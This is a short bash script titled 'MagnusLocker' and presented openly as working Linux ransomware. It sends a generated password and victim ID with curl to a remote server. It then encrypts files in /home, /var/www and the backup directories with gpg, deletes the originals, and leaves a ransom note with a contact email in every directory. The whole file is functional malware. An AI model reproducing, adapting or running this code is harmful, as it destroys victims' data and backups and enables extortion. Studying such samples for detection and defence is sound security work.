#!/bin/bash

#MagnusLocker Ransomware written in bash powered by GPG encryption
#Linux ransomware
#Author: Twemlow
#Hack The Planet!

if [[ $EUID -ne 0 ]]; then
   echo "you must have root perms to run this script!"
   exit 1
fi

if ! [ -x "$(command -v gpg)" ]; then
  echo 'Error: gpg is not installed. Installing gpg...'
  apt-get update && apt-get install -y gnupg
  echo 'gpg has been installed'
else
  echo 'gpg is already installed'
fi

password=$(openssl rand -base64 32)

victim_id=$(date +%s%N | cut -c1-11)

curl --data "victimid=$victim_id&password=$password" http://server:port/magnus

echo "Encryption in progress..."

target_dir_1="/home"
target_dir_2="/var/www"
target_dir_3="/home/backups"
target_dir_4="/var/backups"

for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 -type f); do
    if [ -d "$file" ]; then
        continue
    fi

    echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 "$file"
    rm "$file"
    mv "$file.gpg" "$file.Magnus"
done

echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt

for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 -type d); do
    cp R34DM3.txt "$dir/R34DM3.txt"
done

echo "Encryption has finished!"
